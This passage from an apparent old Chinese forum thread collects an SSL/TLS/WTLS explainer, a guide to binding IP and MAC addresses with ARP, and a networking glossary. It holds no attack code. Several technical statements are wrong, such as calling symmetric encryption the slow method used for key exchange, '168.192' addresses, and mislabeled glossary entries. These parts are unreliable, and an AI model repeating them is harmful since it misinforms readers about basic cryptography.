之间传输的消息便是“安全的”。 
而这种“安全”究竟是怎么实现的，最终有能实现多大程度的保密？本文希望能 

用通俗的语言阐明其实现原理。 


二 整体结构概览 

SSL是一个介于HTTP协议与TCP之间的一个可选层，其位置大致如下： 

－－－－－－－－－ 
| HTTP | 
－－－－－－－－－ 
| SSL | 
－－－－－－－－－ 
| TCP | 
－－－－－－－－－ 
| IP | 
－－－－－－－－－ 

如果利用SSL协议来访问网页，其步骤如下： 
用户：在浏览器的地址栏里输入https://www.sslserver.com 
HTTP层：将用户需求翻译成HTTP请求，如 
GET /index.htm HTTP/1.1 
Host http://www.sslserver.com 

SSL层: 借助下层协议的的信道安全的协商出一份加密密钥，并用此密钥来加密 

HTTP请求。 
TCP层：与web server的443端口建立连接，传递SSL处理后的数据。 

接收端与此过程相反。 

SSL在TCP之上建立了一个加密通道，通过这一层的数据经过了加密，因此达到保 

密的效果。 

SSL协议分为两部分：Handshake Protocol和Record Protocol,。其中Handshake 

Protocol用来协商密钥，协议的大部分内容就是通信双方如何利用它来安全的协 

商出一份密钥。 Record Protocol则定义了传输的格式。 




三 需要的加密方面的基础知识 
了解SSL原理需要一点点加密的概念，这里把需要的概念做一下简单阐述： 

加密一般分为三类，对称加密，非对称加密及单向散列函数。 

对称加密：又分分组密码和序列密码。 
分组密码是将明文按一定的位长分组，明文组经过加密运算得到密文组，密文组 

经过解密运算 
（加密运算的逆运算），还原成明文组。 
序列密码是指利用少量的密钥（制乱元素）通过某种复杂的运算（密码算法）产 

生大量的伪随机位流，用于对明文位流的加密。 
解密是指用同样的密钥和密码算法及与加密相同的伪随机位流，用以还原明文位 

流。 

CBC(Cipher Block Chaining)模式这个词在分组密码中经常会用到，它是指一个 

明文分组在被加密之前要与前一个的密文分组进行异或运算。当加密算法用于此 

模式的时候除密钥外，还需协商一个初始化向量（IV），这个IV没有实际意义， 

只是在第一次计算的时候需要用到而已。采用这种模式的话安全性会有所提高。 

分组密码的典型例子为DES,RC5,IDEA。 
序列密码的典型例子为RC4。 

公钥加密： 
简单的说就是加密密钥与解密密钥不同，分私钥和公钥。这种方法大多用于密钥 

交换，RSA便是一个我们熟知的例子。 
还有一个常用的称作DH，它只能用于密钥交换，不能用来加密。 

单向散列函数： 
由于信道本身的干扰和人为的破坏，接受到的信息可能与原来发出的信息不同， 

一个通用的办法就是加入校验码。 
单向散列函数便可用于此用途，一个典型的例子是我们熟知的MD5,它产生128位的 

摘要，在现实中用的更多的是安全散列算法（SHA），SHA的早期版本存在问题， 

目前用的实际是SHA－1，它可以产生160位的摘要，因此比128位散列更能有效抵 

抗穷举攻击。 

由于单向散列的算法都是公开的，所以其它人可以先改动原文，再生成另外一份 

摘要。解决这个问题的办法可以通过HMAC（RFC 2104）,它包含了一个密钥，只有 

拥有相同密钥的人才能鉴别这个散列。 



四 密钥协商过程 

由于对称加密的速度比较慢，所以它一般用于密钥交换，双方通过公钥算法协商 

出一份密钥，然后通过对称加密来通信，当然，为了保证数据的完整性，在加密 

前要先经过HMAC的处理。 


SSL缺省只进行server端的认证，客户端的认证是可选的。以下是其流程图（摘自 

TLS协议）。 


Client Server 

Clienth*llo --------> 
Serverh*llo 
Certificate* 
ServerKeyExchange* 
CertificateRequest* 
<-------- Serverh*lloDone 
Certificate* 
ClientKeyExchange 
CertificateVerify* 
[ChangeCipherSpec] 
Finished --------> 
[ChangeCipherSpec] 
<-------- Finished 
Application Data <-------> Application Data 

简单的说便是：SSL客户端（也是TCP的客户端）在TCP链接建立之后，发出一个 

Clienth*llo来发起握手，这个消息里面包含了自己可实现的算法列表和其它一些 

需要的消息，SSL的服务器端会回应一个Serverh*llo，这里面确定了这次通信所 

需要的算法，然后发过去自己的证书（里面包含了身份和自己的公钥）。Client 

在收到这个消息后会生成一个秘密消息，用SSL服务器的公钥加密后传过去，SSL 

服务器端用自己的私钥解密后，会话密钥协商成功，双方可以用同一份会话密钥 

来通信了。 


五 密钥协商的形象化比喻 

如果上面的说明不够清晰，这里我们用个形象的比喻，我们假设A与B通信，A是 

SSL客户端，B是SSL服务器端，加密后的消息放在方括号[]里，以突出明文消息的 

区别。双方的处理动作的说明用圆括号（）括起。 

A：我想和你安全的通话，我这里的对称加密算法有DES,RC5,密钥交换算法有RSA 

和DH，摘要算法有MD5和SHA。 

B：我们用DES－RSA－SHA这对组合好了。 
这是我的证书，里面有我的名字和公钥，你拿去验证一下我的身份（把证书发给A 

）。 
目前没有别的可说的了。 

A：（查看证书上B的名字是否无误，并通过手头早已有的CA的证书验证了B的证书 

的真实性，如果其中一项有误，发出警告并断开连接，这一步保证了B的公钥的真 

实性） 
（产生一份秘密消息，这份秘密消息处理后将用作加密密钥，加密初始化向量和 

hmac的密钥。将这份秘密消息-协议中称为per_master_secret-用B的公钥加密， 

封装成称作ClientKeyExchange的消息。由于用了B的公钥，保证了第三方无法窃 

听） 
我生成了一份秘密消息，并用你的公钥加密了，给你（把ClientKeyExchange发给 

B） 
注意，下面我就要用加密的办法给你发消息了！ 
（将秘密消息进行处理，生成加密密钥，加密初始化向量和hmac的密钥） 
[我说完了] 



B：（用自己的私钥将ClientKeyExchange中的秘密消息解密出来，然后将秘密消 

息进行处理，生成加密密钥，加密初始化向量和hmac的密钥，这时双方已经安全 

的协商出一套加密办法了） 
注意，我也要开始用加密的办法给你发消息了！ 
[我说完了] 

A: [我的秘密是...] 

B: [其它人不会听到的...] 


六 加密的计算 
上一步讲了密钥的协商，但是还没有阐明是如何利用加密密钥，加密初始化向量 

和hmac的密钥来加密消息的。 
其实其过程不过如此： 
1 借助hmac的密钥，对明文的消息做安全的摘要处理，然后和明文放到一起。 
2 借助加密密钥，加密初始化向量加密上面的消息。 


七 安全性 
SecurityPortal在2000年底有一份文章《The End of SSL and SSH?》激起了很多 

的讨论， 
目前也有一些成熟的工具如dsniff（http://www.monkey.org/~dugsong/dsniff/ 

）可以 
通过man in the middle攻击来截获https的消息。 

从上面的原理可知，SSL的结构是严谨的，问题一般出现在实际不严谨的应用中。 

常见的攻击就是 
middle in the middle攻击，它是指在A和B通信的同时，有第三方C处于信道的中 

间，可以完全 
听到A与B通信的消息，并可拦截，替换和添加这些消息。 

1 SSL可以允许多种密钥交换算法，而有些算法，如DH，没有证书的概念，这样A 

便无法验证B的公钥 
和身份的真实性，从而C可以轻易的冒充，用自己的密钥与双方通信，从而窃听到 

别人谈话的内容。 
而为了防止middle in the middle攻击，应该采用有证书的密钥交换算法。 
2 有了证书以后，如果C用自己的证书替换掉原有的证书之后，A的浏览器会弹出 

一个警告框进行警告，但又有多少人会注意这个警告呢？ 
3 由于美国密码出口的限制，IE，netscape等浏览器所支持的加密强度是很弱的 

，如果只采用浏览器自带的加密功能的话，理论上存在被破解可能。 

SSL.TLS.WTLS原理（下） 


八 代理 
下面探讨一下SSL的代理是怎样工作的(可参见[6])。这可能与你开始想的不太一 

样：） 
当在浏览器里设置了https的代理，而且在浏览器里输入了 

https://www.example.com之后， 
浏览器会与proxy建立tcp链接，然后向其发出这么一段消息： 
CONNECT server.example.com:443 HTTP/1.1 
Host: server.example.com:443 

然后proxy会向webserver端建立tcp连接,之后，这个代理便完全成了个内容转发 

装置。浏览器 
与web server会建立一个安全通道，因此这个安全通道是端到端的，尽管所有的 

信息流过了proxy, 
但其内容proxy是无法解密和改动的（当然要由证书的支持，否则这个地方便是个 

man in the middle攻击的好场所，见上面的讨论）。 



九 关于证书 

注意，如果对于一般的应用，管理员只需生成“证书请求”（后缀大多为.csr） 

，它包含你的名字和公钥，然后把这份请求交给诸如verisign等有CA服务公司（ 

当然，连同几百美金）， 
你的证书请求经验证后，CA用它的私钥签名，形成正式的证书发还给你。管理员 

再在web server上导入这个证书就行了。如果你不想花那笔钱，或者想了解一下 

原理，可以自己做CA。 
从ca的角度讲，你需要CA的私钥和公钥。从想要证书的服务器角度将，需要把服 

务器的证书请求交给CA. 

如果你要自己做CA，别忘了客户端需要导入CA的证书（CA的证书是自签名的，导 

入它意味着你“信任”这个CA签署的证书）。 
而商业CA的一般不用，因为它们已经内置在你的浏览器中了。 


十 wtls 

在WAP的环境中，也有安全加密的需求，因此wapforum参照在WWW世界里最为流行 

的SSL协议设计了WTLS.从原理上说，这份协议与SSL是基本相同的，但在具体的地 

方作了许多改动。这些改动的大多没有什么技术上的需要，而是由于考虑到手持 

设备运算与存储的局限而尽量做了简化。不过我的感觉是这些改动意义实在不大 

，其获得的计算和存储上节省出来的时间和空间并不多。在硬件速度突飞猛进的 

时代，这种改动能获得的好处也许并不很多（一个新的协议便需要大量新的投入 

，而且与原有体制并不兼容，关于这点有文章[7]做了精彩阐述，可参看）。 

这里我简单举一些SSL与WTLS的差别。 

1 WTLS在一般udp这类不可靠信道之上工作，因此每个消息里要有序列号，协议里 

也要靠它来处理丢包，重复等情况。 
此外，拒绝服务攻击也因此变得更加容易。 
2 WTLS建立的安全连接是在wap网关和手持设备之间，wap网关和web server之间 

如果也要保密，便要采再用SSL，即在这种模型中无法实现端到端的加密。 

---------- ------------- --------- 
| Mobile |----------->| WAP |---------->| WEB | 
| Device |<-----------| Gateway |<----------|Server | 
| | WTLS | | SSL | | 
---------- ------------- --------- 


3 WTLS协议里加了一种成为key_refresh的机制,当传递了一定数量数据包后，双 

方通过同样的算法将自己的密钥做一下更新。付出了很小的代价，安全性得以增 

强。 


参考文献 

[1] SSL 3.0 SPECIFICATION 
http://home.netscape.com/eng/ssl3/ 
[2] TLS 
http://www.ietf.org/rfc/rfc2246.txt 
[3] 《应用密码学》 
机械工业出版社 
[4] The End of SSL and SSH? 
http://securityportal.com/cover/coverstory20001218.html 
[5] HTTP Over TLS 
http://www.ietf.org/rfc/rfc2818.txt 
[6] HTTP Upgrade to TLS 
http://www.ietf.org/rfc/rfc2817.txt 
[7] W* Effect Considered Harmful 
http://www.4k-associates.com/IEEE-L7-WAP-BIG.html 
[8] 智能卡数字加密技术 
http://www.yicard.com/cardtech/smartcard/jiami/index.htm 
[9] HMAC: Keyed-Hashing for Message Authentication 
http://www.ietf.org/rfc/rfc2104.txt 

关于MAC地址和IP地址的知识 

在校园网络中，最方便的捣乱方法就是盗用别人的IP地址，被盗用IP地址的计算 

机不仅不能正常使用校园网络，而且还会频繁出现IP地址被占用的提示对话框， 

给校园网络安全和用户应用带来极大的隐患。捆绑IP地址和MAC地址就能有效地避 

免这种现象。 
　　何为MAC地址 

　　网卡在使用中有两类地址，一类是大家都熟悉的IP地址，另一类就是MAC地址 

，即网卡的物理地址，也称硬件地址或链路地址，这是网卡自身的惟一标识，就 

仿佛是我们的身份证一样，一般不能随意改变。它与网络无关，无论把这个网卡 

接入到网络的什么地方，MAC地址都是不变的。其长度为48位二进制数，由12个00 

~0FFH的16进制数组成，每个16进制数之间用“-”隔开，如“00-10-5C-AD-72-E3 

”。 

　　如何查找MAC地址 

　　1、在Windows 9x/2000/XP下单击“开始/程序”，找到“MS-DOS方式”或“ 

命令提示符”。 

　　2、在命令提示符下输入：“Ipconfig/all”，回车后出现如附图所示的对话 

框，其中的“Physical Address”即是所查的MAC地址。 



　　如何捆绑MAC地址和IP地址 

　　进入“MS-DOS方式”或“命令提示符”，在命令提示符下输入命令：ARP - s 

10.88.56.72 00-10-5C-AD-72-E3，即可把MAC地址和IP地址捆绑在一起。 

　　这样，就不会出现IP地址被盗用而不能正常使用校园网络的情况（当然也就 

不会出现错误提示对话框），可以有效保证校园网络的安全和用户的应用。 

　　注意：ARP命令仅对局域网的上网代理服务器有用，而且是针对静态IP地址， 

如果采用Modem拨号上网或是动态IP地址就不起作用。ARP命令的各参数的功能如 

下： 

　　ARP -s -d -a 

　　-s：将相应的IP地址与物理地址的捆绑，如本文中的例子。 

　　-d：删除相应的IP地址与物理地址的捆绑。 

　　-a：通过查询ARP协议表显示IP地址和对应物理地址情况。 

3.IP地址和物理地址成对被盗用是怎么回事? 

比如，在局域网中，由主机自动分配IP地址，或自己指定IP地址，
自动分配时，先开主机，然后下面的再开的机子自动分配IP为168.192.0.2，
168.192.0.3。。。依此推下去，或自己指定IP，如，主机（1号机）为 

168.192.0.1，2号机为168.192.0.2，依此推下去， 

在局域网络里，IP地址分配好的情况下，比如，我现在做的是5号机，本来IP应该 

是168.192.0.5，但我在设置指定IP时，改为168.192.0.2，这样，就等于说，占 

用了2号机的IP，当2号机再启动时，就会出现提示说IP被占用，无法连接网络， 

造成上不了网或网络共享访问，简单来讲就是这样了 

解决的方法，就是把，那个IP和本机的网卡MAC地址捆绑，让别的占用不成 







--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 11:52am 

org术语表1
? 1 0 0 B a s e - V G或者1 0 0 V G - A n y L A N―使用需求优先权传输数据包的一种速率为
1 0 0 M b p s的通信技术。
? 1 0 0 B a s e - X―1 0 0 M b p s的快速以太网标准，使用C S M A / C D访问方法进行通信，具体说
明见标准IEEE 802.3u。
A
? access server (访问服务器)―访问服务器是将同步设备和异步设备连接到网络、并为
同步通信和异步通信提供路由技术的一个单元。
? active hub (有源电缆接头)―有源电缆接头是在星形拓扑结构中连接结点的一种网络
传输设备，每当数据信号通过集线器时，可以对其进行重建、重定时和放大。
? Address Resolution Protocol (地址解析协议, ARP)―一种基于T C P / I P的协议，利用该
协议，发送结点可以确定接收结点的M A C地址。
? American National Standards Institute (美国国家标准协会, ANSI)―这是致力于为各种
产品(包括网络设备)建立标准的组织。
? American Standard Code for Information Interchange ( 美国信息交换标准码, ASCII)―
一种8位字符编码的方法，由9 6个大写字母、小写字母和数字另加3 2个非打印字符组成。
? analog (模拟)―模拟是一种可以连续变化的各种类型的传输，如正电压和负电压的电
波。
? A p p l e Ta l k―对等协议，用于网络上多台M a c i n t o s h计算机之间的通信。
? application-specific integrated circuit (专用集成电路, ASIC)―在芯片上定制的集成电
路，其中包括特殊的逻辑功能，如快速路由逻辑。
? Asynchronous Transfer Mode (异步传输模式, AT M )―采用信元、多通道和交换在同一
网络上发送音频、视频和数据传输的传输方法。
? ATM attached device (AT M附属设备)―将数据流转换为AT M信元流，或者将AT M信元
流转换成数据流的设备。
? ATM Forum (AT M论坛)―与ITU T一起，致力于AT M的L A N和WA N应用规范制定的
硬件供应商、电信服务提供商以及用户的联盟。
? ATM permanent virtual circuit (AT M永久虚拟电路, PVC)―一个专用电路，在两个指
定端点之间具有预先配置的路径一个固定分配的带宽。
? ATM switch (AT M交换器) ― 一个交换器，以AT M分层通信的方式对信元传输进行操
作。
? ATM switched virtual circuit (AT M转换虚拟电路, SVC)―为分立的通信任务建立并使
用的电路，当该任务完成时，则拆卸该电路。
? attachment unit interface (连接单元接口, AUI)―是一种网络接口，用来将同轴电缆、
双绞线或光纤主干电缆连接到网络结点如集线器、交换机或工作站上。接口由连接器、
电缆、接口回路和电气特性的A U I标准组成。
? attenuation (衰减)―当信号沿通信介质从源(传输结点)发送到接收结点时，丢失的信
号量。
? Audio Video Interleave (音频视频交错, AV I )―AV I是一种声频和视频文件格式，为
Microsoft Windows 3.1或更高环境下的应用而开发。AV I对那些准备复制为短小的“片”
的视频和音频数据进行隔行扫描。 




B
? backbone (主干)―一种高容量的通信介质，用于连接同一层、不同层或跨越长距离的
网络。
? backbone cabling (主干布线)―根据E I A / T I A - 5 6 8标准的定义，主干电缆为在网络设备
室、楼层和建筑物用的电缆。
? band rate (波特率)―波特率衡量数据传输速率，用来描述老式调制解调器的速度，在
一次信号振荡时发出一个数据位。
? bandwidth (带宽)―带宽指通信介质的传输能力，通常以每秒多少位(数据传输)或赫兹
(对于数据、音频和视频传输)来衡量，并由最大传输能力减去最小传输能力决定。
? baseband (基带)―基带是一种传输类型。在基带传输中，通信介质(如电缆)的整个通
道容量只被一个数据信号使用，从而在一定时间只有一个结点用于传输。
? Basic Rate Interface for ISDN (ISDN基本速率接口, BRI)―一种I S D N接口，由三个信
道组成。其中两个6 4 K b p s的信道用于传输数据、语音、视频和图形。第三个1 6 K b p s信
道用于传输信令。
? batch (批处理)―不需要用户或其他计算机系统干预的一个接一个的一系列处理过程。
处理大量数据或一系列复杂功能的计算机的维护工作通常采用这种方式，而且这种工作
通常是在夜间进行的。
? bayonet nut connector (同轴电缆接插件, BNC)―用于细同轴电缆，有一个卡销一样的
套。Male BNC有两个旋钮，插在female BNC的环形槽中。连接时，两个接插件要绞在
一起。
? beaconing (信标)―信标是令牌环网中的错误状态，表明有一个或一个以上的结点出现
操作异常。
? bidirectional interpolation (双向插补)―双向插补是一种视频压缩技术，在序列中影象
的前后影象里都存在与当前影象相同的部分，可以通过创建指向这部分的指针来压缩
帧。
? bits per second (比特/秒, bps)―比特/秒是每秒发送的二进制位( 0或1 )的个数。
? bridge (网桥)―网桥是将使用相同的访问手段的不同局域网段连接在一起的网络传输
设备。例如，使用网桥将一个以太局域网连接到另一个以太局域网，或将令牌环局域网
连接到另一个令牌环局域网上。
? bridge protocol data unit (网桥协议数据单元, BPDU)―B P D U是网桥所用的专门的帧，
用来彼此间交换信息。
术语表计计295
? broadband (宽带)―这种传输中，通信介质上有多个传输通道，允许在同一时刻有多
个结点进行传输。
? broadband ISDN (宽带ISDN, B-ISDN)―当前正处于开发之中，该技术可以提供
1 5 5 M b p s或者更高的数据传送速率。
? broadcast storm (广播扰动)―当大量的计算机或设备要同时传输时，或者当计算机或
设备都要进行重复传输，网络流量超负荷就会引起网络带宽饱和，称之为广播扰动。
? brouter (桥式路由器)―桥式路由器是充当网桥或路由器的一种网络设备，具体是充当
网桥还是路由器，则要根据它转发给定协议的方法而定。
? buffering (缓存)―缓存是一种设备，例如交换机，在存储器中临时存储信息的能力。
? bus (总线)―总线是计算机中用来传输数据的一条路径，例如，在C P U和连接在计算
机上的外设之间的通道。
? bus topology (总线结构)―总线结构是从一台P C或文件服务器连接到另一台的网络设
计，就像链上的链接那样。 



C
? cable plant (电缆线路)―用来构成网络的所有的通信电缆的数量。
? cableco―有线电视公司，如T C I。
? carrier sense (载波侦听)―载波侦听是检验通信介质如电缆等以确定电压级别、信号转
换等的过程，通过载波侦听可以说明网络上是否出现了载有数据的信号。
? Carrier Sense Multiple Access with Collision Detection (带有冲突检测的载波侦听多路存
取, CSMA/CD)―C S M A / C D是以太网中使用的一种网络传输控制方法。它通过检查包
冲突来调整传输。
? cell (信元)―是用于高速传输的格式化数据单元，经常用在AT M中。
? cell switching (信元交换) ― 一种使用T D M和虚拟通道的转换方式，在每一个T D M时
间片的开头都放置一个简短的指示器或虚拟通道标识符。
? Challenge Handshake Authentication Protocol 难题握手鉴定协议( C H A P )― 用于对口令
加密的协议，例如在一个WA N上传输的服务器帐户口令。
? channel bank (信道组)―信道组是在一个集中的位置组合了通信信道(如T- 1 )的大规模
多路转接器。
? channel service unit (通道服务器, CSU)―这种设备是在网络设备(如路由器)和T载波线
路之间的一个物理接口。
? circuit switching (电路交换)―电路交换技术是一种网络通信技术，采用专用的信道在
两个结点间传输信息。
? Classical IP over ATM (AT M上的经典IP) ― AT M上I P的传输，一个严格集中于I P支持
的技术。
? Classless Interdomain Routing (无类别域间路由, CIDR)―一种新的I P编址方法，该方
法忽略了地址的类别设计，在点分十进制地址的后面使用一条斜线，用以指明可用地址
的总数目。
? coaxial cable (同轴电缆)―同轴电缆是一种网络电缆介质，由被绝缘层包围的铜芯组
成。绝缘层又被另外的传导材料如编织导线包围，传导材料又由外层的绝缘材料覆盖。
? collision (冲突)―冲突是在以太网上同时检测到两个或多个包时的状态。
? community name (公用名)―网络代理和网络管理工作站使用的一个口令，其作用是不
让它们的通信被未经授权的工作站或者设备轻易截取。
? community name (公共管理接口协议, CMIP)―该协议是O S I网络管理标准的一部分，
用以收集网络性能数据。
? Compressed Serial Line Internet Protocol (压缩串行线路互连网协议, CSLIP)― S L I P远
程通信协议的扩展，能够提供比S L I P更快的吞吐量。
? computer network (计算机网络)―计算机网络是由通信电缆或无线电波链接的计算机、
打印机设备、网络设备和计算机软件系统。
? concentrator (集中器)―集中器是可以让多个输入和输出同时活动的设备。
? connection-oriented service (面向连接的服务)―这是在L L C子层和网络层间进行的
Type 2操作，提供了多种途径来保证接收结点成功地接收到了数据。
? connectionless service (无连接服务)―无连接服务也就是常说的Type 1操作，是L L C子
层和网络层间的服务，但是这里不能检测数据是否已经确实到达了接收结点。
? current-state encoding (当前状态编码)―这是一种数字信号编码方法，这里，对某信号
状态分配一个二进制值，例如+ 5 v电压为二进制值1，0 v为二进制值0。
? cut-through switching (开通式交换)―通过开通式交换这种交换技术在整个帧到达之前
来转发帧的一部分。
? cyclic redundancy check (循环码校验, CDC)―C D C为一种错误校验方法，这种方法中
要计算包含在帧中的整个信息域的大小，计算出来的值由发送结点的数据链接层插入到
靠近帧尾的位置，并又接收结点的数据链接层进行校验，以确定是否出现了传输错误 






--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 11:52am 

术语表（2） 


D
? data circuit equipment (数据电路设备, DCE)―在X . 2 5网络上，D C E指的是一个分组交
换机或者P D N访问设备。
? data link connection identifier (数据链路连接标识, DLCI)―在帧中继网络上用以标识
单个的虚拟连接。
? Data Link Control (数据链路控制, DLC)―设计用于与一个I B M大型机或微型机通信的
协议，它使用S N A通信。
? data service unit (数据服务器, DSU)―与C S U共同使用的一种设备，用于T载波线路上
的通信。D S U为接收网络而转换在线路上传输和接收的数据。
? data terminal equipment (数据终端设备, DTE)―在X . 2 5网络上，D T E是指运行在分组
交换网络上的终端、工作站、服务器和主计算机等。不管实际使用的设备到底是什么，
有时都将D T E设备称为终端。
? data warehouse (数据仓库)―一种数据库访问技术，这种技术将一个主机数据库(例如，
大型机上的数据库)复制到另外一个数据库服务器上，目的是为了能够在不中断主机数
据库的情况下创建报表或者浏览数据，一般情况下可以允许使用点击型报表编写工具。
? datagram (数据报)―X . 2 5的一种传输模式，在这种模式下，没有使用特殊的通信信道，
常常导致数据不能以它们发送时的顺序到达，因为每一个数据报可能会沿不同的路径到
达目的地。
? demand priority (需求优先权)―一种数据通信技术，这种技术可以直接将信息包传送
给目标结点，在传输过程中只经过一个集线器，无需经过其他的网络结点。
? dense wavelength division multiplexing (密集波分多路复用, DWDM)―一种新出现的多
路复用技术，该技术使用单模光纤，可以在一条光缆上建立多个路径同时进行数据传输。
? digital (数字式)―这是一种传输方法，其中不同的信号级都用二进制表示，如二进制0
和1分别代表0 v和+ 5 v。
? digital subscriber line (数字用户线路, DSL)―一种使用高级调制技术的技术，该技术
可以在用户和电话公司之间通过已有的电信网络形成高速的网络连接，其通信速度可以
高达6 0 M b p s。
? discovery (发现)―发现是路由器采用的一个过程，包括采集诸如网络上有多少个结点
以及结点的位置等信息。
? Distance Vector Multicast Routing Protocol (距离向量广播路由协议, DVMRP)―
D V M R P是一种与R I P共同工作的多点广播(也称多点传送)协议，可确定哪个工作站被预
定给了多点传送。
? Domain Name Service (域名服务, DNS)―一种T C P / I P应用协议，该协议可以将计算机
的域名转换为I P地址，或者将I P地址转换为域名。
? dotted decimal notation (点分十进制表示法)―一种编址技术，该技术将四个8位字节，
例如1 0 0 0 0 11 0 . 11 0 111 1 0 . 11 0 0 1 0 11 . 0 0 0 0 0 1 0 1 ，转换成十进制表示( 例如，
1 3 4 . 2 2 2 . 1 0 1 . 0 0 5 )，用以标识网络和网络上的单个主机。
? d r i v e r (驱动程序)―驱动程序是一种软件，可使计算机与N I C、打印机、显示器和硬盘
驱动器进行通信。每一个驱动程序都有其特定的目的，例如，处理以太网通信。
? dynamic addressing (动态编址)―一种编址方法，在这种方法中，无需网络管理员将I P
地址“硬编码”在设备的网络配置中便可以实现I P地址的分配。
? Dynamic Host Configuration Protocol (动态主机配置协议, DHCP)―一种网络协议，通
过D H C P，服务器可以自动地将一个I P地址分配给其网络上的某个设备。
? dynamic routing (动态路由)―在动态路由这种路由进程中，路由器不停地检查网络的
配置，自动更新路由表，并自己来决定如何路由包。 



E
? electromagnetic interference (电磁干扰, EMI)―电磁干扰是马达等电力设备引起的磁力
场产生的信号干扰。
? electronic data interchange (电子数据交换, EDI)―使用电子方法在计算机或电话网络
上传输商业、组织和个人数据。
? Electronic Industries Alliance (电子工业联合会, EIA)―这是发展网络布线标准和电子
接口标准的标准化组织。
? encapsulation (封装)―封装是在网络间转换帧的过程。在这一进程中，要将一种类型
的网络的数据帧放入另一网络使用的头部，使得新的头的作用如同发信时的信封。
? enterprise network (企业网)―企业网是L A N、M A N或WA N的组合，为计算机用户提
供一系列计算机和网络资源，以完成各种工作。
? Ethernet (以太网)―以太网是使用C S M A / C D访问方法进行网络数据传输的一种传输系
统。以太网一般是通过总线或总线―星型拓扑结构实施的。
? Extended Binary Coded Decimal Interchange Code (扩充二进制编码十进制交换码,
E B C D I C )―这是一种主要用于I B M大型机的字符编码技术，对2 5 6个字母、数字和特
殊字符组成的字符集进行8位编码。
? E x t r a n e t―一种用WA N链路连接两个或者多个I n t r a n e t所形成的网络。
F
? farm (群)―放置在同一个地方的一组计算机主机(例如大型机)或服务器或两者都有，
例如放置在一个机房内。
? Fast Ethernet (快速以太网)―传输速度在1 0 0 M b p s的以太网通信，其详细说明见标准
IEEE 802.3u。
? fat pipe (粗管)―用于网络主干(如在建筑物的楼层间)以进行高速通信的光纤电缆。
? Fiber Distributed Data Interface (光纤分布式数据接口, FDDI)―F D D I是一种光纤数据
传输方法，采用的拓扑结构为双环拓扑，其传输速度可达1 0 0 M b p s。
? f i b e r-optic cable (光纤电缆)―光纤电缆是一种通信电缆，由两个或多个玻璃或塑料光
纤芯组成，这些光纤芯位于保护性的覆层内，由塑料P V C外部套管覆盖。沿内部光纤进
行的信号传输一般使用红外线。
? File Transfer Protocol (文件传输协议, FTP)―一种T C P / I P应用协议，该协议以批数据
流的方式传输文件，是一种在I n t e r n e t上广泛使用的协议。
? firewall (防火墙)―防火墙是用来保护数据免受外界访问的软件或硬件，也可以防止网
络中数据泄露到外面。
? firmware (固件)―固件是一种存储在R O M等设备的芯片上的软件。
? flow control (流控制)―流控制过程用来确保设备发送信息时的速度不高于接收设备的
接收速度。
? fractal image compression (不规则图象压缩)―不规则图象压缩是一种视频压缩技术，
利用不规则图象片、复制图象和映射的特性来压缩帧。
? frame (帧)―有时“帧”一词可以与“包”交换使用，但帧指的是网络上传输的数据单
元，其中包含与开放系统互连( O S I )的数据链接层(即第2层)相应的控制信息和地址信息。
? frame relay (帧中继)―一种通信协议，使用分组交换和虚拟电路技术进行分组传输，
该技术通过将大量的差错检验功能留给中间结点，可以获得较高的数据传输速率。
? frequency-division multiple access ( 频分多路访问技术, FDMA)―频分多重访问技术在
一种通信介质上通过给每一个信道确立不同的频率来创建不同的信道。
? full-duplex (全双工)―全双工是指可以同时发送、接收信号的能力。 




G
? gateway (网关)―网关是一种网络设备，可使不同类型的网络间相互通信，如在复杂
的协议间或不同的E- m a i l系统间进行通信。
H
? half-duplex (半双工)―半双工是指可以发送接收信号、但不能同时进行的能力。
? hop (跳)―跳是帧或包从一个网络向另一个网络点对点的运动。
? horizontal cabling (水平布线)―根据E I A / T I A - 5 6 8标准的定义，水平布线为在同一工作
区域中连接工作站和服务器的布线。
? host (主机)―主机是具有操作系统的，多台计算机可同时访问其文件、数据和服务的
计算机(包括大型机、小型机、服务器或工作站)。程序和信息可在主机上进行处理，或
下载到访问计算机(客户机)上来处理。
? hub (集线器)―集线器是将各个单独的电缆段或单独的L A N连接在一起成为一个网络
的中央设备。
? hybrid fiber/coax (混合光纤/同轴, HFC)电缆―这种电缆由电缆护套组成，电缆护套中
包含着光纤和铜电缆的组合。 

‘ 


I
? impedance (阻抗)―阻碍电流流动的总值。
? Institute of Electrical and Electronics Engineers (电气电子工程师协会, IEEE)―这是由
一群科学家、工程师、技术人员和教育家组成的组织，在开发网络布线和数据传输标准
方面起着领导作用。
? Integrated Services Digital Network (综合业务数字网, ISDN)―一种在电话线上传输数
据服务的网络标准，当前的实际速率为1 . 5 3 6 M b p s，理论上可以达到6 2 2 M b p s的传输速
率。
? Integrated Services Digital Network (综合服务数字网, ISDN)―I S D N是在电话线上用
信道的组合来传递音频、数据和视频服务的WA N技术。
? International Organization for Standardization (国际标准化组织, ISO)―I S O是一国际组
织，致力于建立通信和网络标准，其最为突出、广为人知的贡献是建立了网络协议标
准。
? International Telecommunications Union (国际通信联盟, I T U )―I T U是国际上致力于规
定远程通信标准的组织，例如，它为调制解调器和WA N通信制订了标准。
? Internet Engineering Task Force ( Internet工程任务组, IETF)―I E T F是I S O C的左膀右
臂，致力于与Internet 相关的技术问题。
? Internet Function (互连功能, IWF) ― 一个标准，为在AT M上实现帧中继提供重新映射
及封装功能。
? Internet Group Management Protocol (互联网分组管理协议, IGMP)―在多点传送中使
用的协议，其中含有接收用户的地址，服务器使用它来通知路由器哪一个工作站属于多
点传送组。
? Internet ―Internet 是由许许多多网络设备和多种通信方法链接的成千上万的小型网络
的集合。
下载
? Internet Packet Exchange (网间包交换, IPX)― 由N o v e l l开发的用在它的N e t Wa r e文件
服务器操作系统上的协议。
? Internet Protocel(Internet 协议， I P )―该协议与T C P或U D P结合使用，通过采用点分
十进制编址，使包到达本地或远程网络上的目标地点。。
? Internet Society (Internet 协会, ISOC)―I S O C是一家非盈利的国际组织，主办会议和
出版物，并监督Internet 标准的执行。
? internetworking (网络互连)―网络互连是将相同或不同类型的网络连接在一起以便相
互通信的过程。
? I n t r a n e t―某个公司组织的私有网络，在该网络中，可以和I n t e r n e t一样使用相同的基
于We b的网络工具，但是对公众的访问有严格的限制。I n t r a n e t通常由一个L A N上的一个
或者多个子网或者V L A N组成。
J
? jamming (阻塞)―交换机使用的一种数据流量控制技术，用来指示由于大量数据引起
的交换机过载。在这种方式中，交换机通过倍增载波信号来模拟冲突。
? jitter (抖动)―抖动是网络上延迟不定的具体表现，抖动会在声频重放时引起明显的错
误，如播放声频时的杂音等。
